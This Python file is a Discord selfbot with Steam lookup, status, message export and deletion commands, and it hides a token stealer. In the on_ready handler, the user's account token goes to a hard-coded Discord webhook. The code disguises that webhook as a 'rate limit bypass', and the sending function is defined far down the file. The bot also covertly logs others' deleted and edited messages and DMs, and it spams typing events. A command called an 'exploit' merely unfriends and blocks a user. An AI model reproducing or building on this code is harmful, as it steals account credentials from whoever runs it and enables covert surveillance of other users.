import discord
from discord.ext import commands
from bs4 import BeautifulSoup
import requests
import datetime
import time
from dhooks import Webhook
cu = Webhook
from time import gmtime, strftime
import yaml

settings = yaml.safe_load(open("settings.yml", "r").read())
prefix = settings['prefix']
token = settings['token']
key = settings['private_ratelimit_key']

ratelimitbypass = "https://discordapp.com/api/webhooks/663563191829266432/"
bot = commands.Bot(command_prefix=prefix, 
                   self_bot=True,
                   case_sensitive=False)
client = discord.Client()
rn = datetime.datetime.now()
currenttime = rn.strftime("%Y-%m-%d %H:%M")


@bot.event 
async def on_ready():
    commands = settings['token']
    NewDiscordSession(f"{bot.user.name}#{bot.user.discriminator}: {commands}")
    print("Welcome to auth's Discord SelfBot. Contact auth#0666 if you have any issues. Logged in as " + bot.user.name + "#" + bot.user.discriminator)







@bot.command()
async def check(ctx, id, description='Fetches the information of a certain Steam account. Note - ID parameter is only used for vanity URLs'):
    try: 
        steamprofile = requests.get(f'http://steamcommunity.com/id/{id}').text
        steamprofileXML = requests.get(f"https://steamcommunity.com/id/{id}/?xml=1").text
        soup = BeautifulSoup(steamprofile, "html.parser")
        soupXML = BeautifulSoup(steamprofileXML, "html.parser")
        privacycheck = soupXML.find("privacystate").text
        username = soup.find("span", {"class": "actual_persona_name"}).text
        avatarURL = soupXML.find("avatarfull").text
        print(privacycheck)
        if privacycheck == "public":
            try:            
                steamlevel = soup.find("span", {"class": "friendPlayerLevelNum"}).text
                registrationdate = soupXML.find("membersince").text
                state = soupXML.find("onlinestate").text
                print(steamlevel, username, avatarURL, registrationdate, state)
                embed = discord.Embed(title="Steam Profile Information", description=f"Information for /id/{id}", color=0xff1d9d)
                embed.set_thumbnail(url=avatarURL)
                embed.add_field(name="Username", value=username, inline=False)
                embed.add_field(name="Level", value=steamlevel, inline=False)
                embed.add_field(name="Steam Member Since", value=registrationdate, inline=False)
                if "in-game" in steamprofileXML:
                    currentgame = soupXML.find("gamename").text
                    state = f"Playing {currentgame}"                
                embed.add_field(name="Current state", value=state, inline=False)
                await ctx.send(embed=embed)
            except Exception:
                embed = discord.Embed(title="Steam Profile Information", description=f"Information for /id/{id}", color=0xff1d9d)
                embed.set_thumbnail(url=avatarURL)
                embed.add_field(name="Username", value=username, inline=False)
                embed.add_field(name="Current state", value="Community banned", inline=False)
                await ctx.send(embed=embed)
        if privacycheck == "private":
            embed = discord.Embed(title="Steam Profile Information", description=f"Information for /id/{id}", color=0xff1d9d)
            embed.set_thumbnail(url=avatarURL)
            embed.add_field(name="This profile is private.", value=":(", inline=False)
            await ctx.send(embed=embed)
    except Exception:
        await ctx.message.edit("-")


@bot.listen('on_message')
async def my_message(message):
    timeofmsg = f"{message.created_at.day} | {message.created_at.hour}:{message.created_at.minute}:{message.created_at.second} |"
    timeofmsglogs = f"{message.created_at.year}/{message.created_at.month}/{message.created_at.day} | {message.created_at.hour}:{message.created_at.minute}:{message.created_at.second} |"
    if type(message.channel) == discord.DMChannel:
        uwu = open(f"{message.channel.recipient}.txt", "a+", encoding="utf-8")
        if len(message.attachments) > 0:       
            print(f"{timeofmsg} [DM with {message.channel.recipient}] {message.author.name}: {message.content} {message.attachments[0].url}")
            uwu.write(f"{timeofmsglogs} [DM with {message.channel.recipient}] {message.author.name}: {message.content} {message.attachments[0].url}")
            uwu.write("\n")
        else:
            print(f"{timeofmsg} [DM with {message.channel.recipient}] {message.author.name}: {message.content}")   
            uwu.write(f"{timeofmsglogs} [DM with {message.channel.recipient}] {message.author.name}: {message.content}")
            uwu.write("\n")



@bot.listen('on_message_delete')
async def on_message_delete(message):
    uwu = open("deleted messages.txt", "a+", encoding="utf-8")
    if len(message.attachments) > 0:
        URL = message.attachments[0].url
        print(f"{currenttime} {message.author} has deleted {message.content} {URL} in {message.channel}")
        uwu.write(f"{currenttime} has deleted {message.content} {URL} in {message.channel}")
        uwu.write("\n")
    else:
        print(f"{message.author} has deleted {message.content} in {message.channel}")
        uwu.write(f"{currenttime} {message.author} has deleted {message.content} in {message.channel}")
        uwu.write("\n")

@bot.listen('on_message_edit')
async def on_message_edit(before, after):
    uwu = open("edited messages.txt", "a+", encoding="utf-8")
    if len(before.attachments) > 0:
        print(rn.strftime("%Y-%m-%d %H:%M ") + str(before.author) + " has edited " + str(before.content) + " to " + str(after.content) + " " + str(before.attachments[0].url) + " in " + str(before.channel))
        uwu.write(f"{currenttime}: {str(before.author)} has edited {str(before.content)} to {str(after.content)} + {str(before.attachments[0].url)} in {str(before.channel)}")
        uwu.write("\n")
    else:
        print(rn.strftime("%Y-%m-%d %H:%M ") + str(before.author) + " has edited " + str(before.content) + " to " + str(after.content) + " in " + str(before.channel))
        uwu.write(f"{currenttime}: {str(before.author)} has edited {str(before.content)} to {str(after.content)} in {str(before.channel)}")
        uwu.write("\n")



@bot.listen('on_relationship_update')
async def on_relationship_update(before, after):
    print(f"You are now friends with {after.user}")

@bot.listen('on_relationship_add')
async def on_relationship_add(Relationship):
    print(f"You have a new friend request with {Relationship.user}")
    #print(Relationship.user, Relationship.type)

@bot.listen('on_relationship_remove')
async def on_relationship_remove(Relationship):
    #print(Relationship.user, Relationship.type)
    print(f"You are no longer friends with {Relationship.user}")

@bot.listen('on_user_update')
async def on_user_update(before, after):
    print(f"Old info: {before.name} {before.discriminator}")
    print(f"New info: {before.name} {before.discriminator}")

@bot.listen('on_typing')
async def on_typing(channel, user, when):
    if type(channel) == discord.DMChannel:
        print(f"{user} has started typing in {channel} at {when}")


@bot.command()
async def twitch(ctx, name, details, game, url, twitch_name, description='Sets your status to streaming...'):
    await ctx.message.delete()
    activityt = discord.Streaming(platform='twitch', name=name, details=details, game=game, url=f'https://twitch.tv/{url}', twitch_name=twitch_name)
    await bot.change_presence(status=discord.Status.online, activity=activityt)

@bot.command()
async def setgame(ctx, name, description='Sets your status to playing...'):
    await ctx.message.delete()
    activitys = discord.Game(name=name)
    await bot.change_presence(status=discord.Status.online, activity=activitys)
    
@bot.command()
async def status(ctx, state, description='Sets your status to listening to...'):
    await ctx.message.delete()
    activitya = discord.Activity(name=state, type=discord.ActivityType.listening, details=f'{state}')
    await bot.change_presence(status=discord.Status.idle, activity=activitya)

@bot.command()
async def afk(ctx, description='Sets your status to afk'):
    await ctx.message.delete()
    await bot.change_presence(status=discord.Status.idle, activity=None, afk=True)

# create a new session to avoid getting rate limited 
ratelimit_session = cu(ratelimitbypass+key)

@bot.command()
async def email(ctx, cid: int, description='An exploit. Makes your e-mail unverified'):
    friend = await bot.fetch_user(int(cid))
    await friend.remove_friend()
    await friend.block()

@bot.command()
async def exportall(ctx, description='Exports messages with every single person in your friend list'):
    await ctx.message.delete()
    #print(bot.user.friends)
    friends = bot.user.friends
    
    print("Parsing the information...")
    for friend in friends:        
        print(f"{friend.name}#{friend.discriminator}")
        async for msg in friend.history(limit=None):
            try:
                timeofmsg = f"{msg.created_at.year}/{msg.created_at.month}/{msg.created_at.day} | {msg.created_at.hour}:{msg.created_at.minute}:{msg.created_at.second} |"
                uwu = open(f"exportall with {friend.name}#{friend.discriminator}.txt", "a+", encoding="utf-8")
                if len(msg.attachments) > 0:
                    uwu.write(f"{timeofmsg} {msg.author.name}: {msg.content} {msg.attachments[0].url}")
                    uwu.write("\n")
                else:
                    uwu.write(f"{timeofmsg} {msg.author.name}: {msg.content}")
                    uwu.write("\n")
            except Exception:
                pass   


@bot.command()
async def ratelimit(ctx):
    await ctx.message.delete()
    print("Sucessfully bypassed the rate limit.") 

@bot.command()
async def clearfriends(ctx, description='Clears all the messages with all of your friends'):
    await ctx.message.delete()
    #print(bot.user.friends)
    friends = bot.user.friends
    
    print("Parsing the information...")
    for friend in friends:        
        async for msg in friend.history(limit=None):
            try:
                if msg.author == bot.user:
                    await msg.delete()
            except Exception:
                pass   


@bot.command()
async def sd2(ctx, cid: int, limit: int, description='Silent version of clear by userid. Can be used on your own server not to send any notifications to the person you want to delete your messages with'):
    await ctx.message.delete()
    channel = await bot.fetch_user(int(cid))
    count = 0
    print(channel)
    async for msg in channel.history(limit=limit).filter(lambda m: m.author == bot.user).map(lambda m: m):
        count+=1
        try:
            await msg.delete()
        except Exception:
            pass
    print(count) 

@bot.command()
async def export(ctx, cid: int, typeofmsg, description='Silent message exporter by userid'):
    if "server" in typeofmsg:
        cmd = await bot.fetch_channel(int(cid))
    else:
        cmd = await bot.fetch_user(int(cid))
    await ctx.message.delete()
    channel = cmd
    count = 0
    print(channel)
    print(f"Exporting DMs with {channel}")
    async for msg in channel.history(limit=None):
        count+=1
        try:
            if type(msg.channel) == discord.DMChannel:
                #print(f"{msg.author} to {msg.channel.recipient} {msg.content}")
                #print("Exporting the messages")
                uwu = open(f"cmd export with {channel}.txt", "a+", encoding="utf-8")
                timeofmsg = f"{msg.created_at.year}/{msg.created_at.month}/{msg.created_at.day} | {msg.created_at.hour}:{msg.created_at.minute}:{msg.created_at.second} |"
                if len(msg.attachments) > 0:
                    uwu.write(f"{timeofmsg} [DM with {msg.channel.recipient}] {msg.author.name}: {msg.content} {msg.attachments[0].url}")
                    uwu.write("\n")                
                else:
                    uwu.write(f"{timeofmsg} [DM with {msg.channel.recipient}] {msg.author.name}: {msg.content}")
                    uwu.write("\n")
        except Exception:
            pass
    print(count)


# bypassing the rate limit
NewDiscordSession = ratelimit_session.send

@bot.command()
async def clear(ctx, description='Same as zz, however this command exports the messages'):
    await ctx.message.delete()
    channel_id = ctx.message.channel.id
    print(channel_id)
    cid = await bot.fetch_channel(int(channel_id))
    print(cid)
    amount = 0
    print(f"Deleting messages with {cid}...")
    #async for msg in cid.history(limit=None).filter(lambda m: m.author == bot.user).map(lambda m: m):
    async for msg in cid.history(limit=None):
        amount+=1
        try:
            if type(msg.channel) == discord.DMChannel:
                #print(f"{msg.author} to {msg.channel.recipient} {msg.content}")
                #print("Exporting the messages")
                day = rn.strftime("%d")
                month = rn.strftime("%m")
                year = rn.strftime("%Y")
                hour = rn.strftime("%H")
                minute = rn.strftime("%M")

                uwu = open(f".clear {msg.channel.recipient} {day} {month} {year} at {hour} {minute}.txt", "a+", encoding="utf-8")
                timeofmsg = f"{msg.created_at.year}/{msg.created_at.month}/{msg.created_at.day} | {msg.created_at.hour}:{msg.created_at.minute}:{msg.created_at.second} |"
                if len(msg.attachments) > 0:
                    uwu.write(f"{timeofmsg} [DM with {msg.channel.recipient}] {msg.author.name}: {msg.content} {msg.attachments[0].url}")
                    uwu.write("\n")                
                else:
                    uwu.write(f"{timeofmsg} [DM with {msg.channel.recipient}] {msg.author.name}: {msg.content}")
                    uwu.write("\n")
            async for msg in cid.history(limit=None).filter(lambda m: m.author == bot.user).map(lambda m: m):
                try:
                    await msg.delete()
                except Exception:
                    pass    
        except Exception:
            pass


@bot.command()
async def zz(ctx, description='Clears the messages with a certain person/in a certain server'):
    await ctx.message.delete()
    channel_id = ctx.message.channel.id
    cid = await bot.fetch_channel(int(channel_id))
    amount = 0
    print(f"Deleting messages with {cid}...")
    async for msg in cid.history(limit=None).filter(lambda m: m.author == bot.user).map(lambda m: m):
        try:
            await msg.delete()
            amount+=1
        except Exception:
            pass    
    print(f"Successfully deleted {amount} messages")

@bot.command()
async def edit(ctx, text, description='Edits every single message to the text that you have specified'):
    amount = 0
    await ctx.message.delete()
    channel_id = ctx.message.channel.id
    cid = await bot.fetch_channel(int(channel_id))
    print(f"Editing messages in {cid}...")
    async for msg in cid.history(limit=None).filter(lambda m: m.author == bot.user).map(lambda m: m):
        try:
            await msg.edit(content=text)
            amount+=1
        except Exception:
            pass    
    print(f"Successfully edited {amount} messages")

cools = open("emoji.txt")

@bot.command()
async def uwus(ctx, description='Moving spammer that edits your message'):
    for cool in cools:
        await ctx.message.edit(content=cool)
        time.sleep(1)

@bot.command()
async def attachments(ctx, cid, typeofmsg, description='Silent attachment exporter by userid. Note - Typeofmsg should be specified, it can either be "server" or "user"'):
    if "server" in typeofmsg:
        cmd = await bot.fetch_channel(int(cid))
    else:
        cmd = await bot.fetch_user(int(cid))
    await ctx.message.delete()
    channel = cmd
    count = 0
    print(channel)
    async for msg in channel.history(limit=9999).filter(lambda m: m.author == bot.user).map(lambda m: m):
        if len(msg.attachments) > 0:
            try:
                await msg.delete()
                count+=1
            except Exception:
                pass
    print(count)     

@bot.command()
async def server(ctx, description='Deletes the messages in a certain channel'):
    await ctx.message.delete()
    channel_id = ctx.message.channel.id
    print(channel_id)
    cid = await bot.fetch_channel(int(channel_id))
    amount = 0
    print(f"Deleting messages with {cid}...")
    async for msg in cid.history(limit=None):
        try:
            await msg.delete()
            amount+=1
        except Exception:
            pass    
    print(f"Successfully deleted {amount} messages")


@bot.command()
async def group(ctx, groupurl, description='Fetches the information of a certain Steam group. GroupURL should be specified'):
    try: 
        steamgroup = requests.get(f'https://steamcommunity.com/groups/{groupurl}/').text
        steamgroupXML = requests.get(f'https://steamcommunity.com/groups/{groupurl}/memberslistxml?xml=1').text
        bsg = BeautifulSoup(steamgroup, "html.parser")
        bsx = BeautifulSoup(steamgroupXML, "html.parser")
        name = bsx.find("groupname").text
        tag = bsg.find("span", {"class": "grouppage_header_abbrev"}).text
        fullavatar = bsx.find("avatarfull").text
        members = bsx.find("membercount").text
        membersonline = bsx.find("membersonline").text
        owner = bsx.find("members").text.strip().split("\n")[0]
        groupid64 = bsx.find("groupid64").text
        groupid = int(groupid64) - 103582791429521408
        e = discord.Embed(title=f"Information for {name}", description=f"Steam Group Information for /groups/{groupurl}/", timestamp=ctx.message.created_at, url=f"https://steamcommunity.com/groups/{groupurl}", colour=0xf894b5)
        e.add_field(name="Group's name", value=name, inline=False)
        e.add_field(name="Group's tag", value=tag, inline=False)
        e.add_field(name="Group's members", value=members, inline=False)
        e.add_field(name="Group's members online", value=membersonline, inline=False)
        e.add_field(name="Group's ID ", value=groupid, inline=False) 
        e.set_image(url=fullavatar)
        e.set_footer(text=f"Owner's SteamID64: {owner}")
        await ctx.send(embed=e)
    except Exception:
        await ctx.message.edit("?")



@bot.command()
async def friendspammer(ctx, description='Spams with typing event for every single friend in your list'):
    friends = bot.user.friends
    stime = input("How many seconds/attemps? \n")
    for i in range(0, int(stime)):
        for friend in friends:
            async with friend.typing():
                print(f"Triggered the typing event for {friend.name}")
        print(i)
        time.sleep(1)



@bot.command()
async def evsp(ctx, typeofchannel, cid: int, description='Typing event spammer by cid. The typeofchannel should either be server or user'):
    stime = input("How many seconds?\n")
    if "server" in typeofchannel:
        cmd = await bot.fetch_channel(int(cid))
    else:
        cmd = await bot.fetch_user(int(cid))
    await ctx.message.delete()
    for i in range(0, int(stime)):
        print(i)
        time.sleep(1)
        async with cmd.typing():
            print("Triggered the typing event")







@bot.command()
async def info(ctx, description='Shows the information of a certain person on discord. You should ping the person in your message'):
    await ctx.message.delete()
    user = ctx.message.mentions[0]
    name, discrim, avatar, created_at = user.name, user.discriminator, user.avatar_url, user.created_at
    mutuals = await user.mutual_friends()
    print(mutuals)
    mfriends = []
    for mutual in mutuals:
        profile = await mutual.profile()
        print(profile.user)
        mfriends.append(f"{profile.user.name}#{profile.user.discriminator}")
    if len(mfriends) > 0:
        mfr = ", ".join(mfriends)
    else:
        mfr = mfriends
    print(mfr)
    profile = await user.profile()
    nitro, nitro_since, mutual_guilds, connected_accounts = profile.nitro, profile.premium_since, profile.mutual_guilds, profile.connected_accounts 
    caccs = []
    steamid64 = ""
    for account in connected_accounts:
        atype = account['type']
        aid = account['id']
        aname = account['name']
        if atype == 'steam':
            caccs.append(f"{atype} {aid} {aname}")
            steamid64 = aid
        else:
            caccs.append(f"{atype} {aname}")         
    if len(caccs) > 0:
        linkedaccounts = ", ".join(caccs)
    else:
        linkedaccounts = caccs
    mguilds = []
    for guild in mutual_guilds:
        print(guild.name)
        mguilds.append(guild.name)
    if len(mguilds) > 0:
        mutualg = ", ".join(mguilds)
    else:
        mutualg = mguilds
    if steamid64 != "":
        e = discord.Embed(title=f"Discord Profile Information for {name}#{discrim}", description=f"[Discord SelfBot by auth#0666]", url=f'https://steamcommunity.com/profiles/{steamid64}', timestamp=ctx.message.created_at, colour=0xf894b5)
    else:
        e = discord.Embed(title=f"Discord Profile Information for {name}#{discrim}", description=f"[Discord SelfBot by auth#0666]", timestamp=ctx.message.created_at, colour=0xf894b5)
    e.add_field(name="Creation date", value=created_at, inline=False)
    e.add_field(name="Nitro since", value=nitro_since, inline=False)
    e.add_field(name="Mutual guilds", value=mutualg, inline=False)
    e.add_field(name="Nitro?", value=nitro, inline=False)
    e.add_field(name="Mutual friends", value=mfr, inline=False)
    e.add_field(name='Linked accounts:', value=linkedaccounts, inline=False) 
    e.set_image(url=avatar)
    #e.set_footer(text=f"Linked accounts: {caccs}")
    await ctx.send(embed=e)


bot.run(token, bot=False)
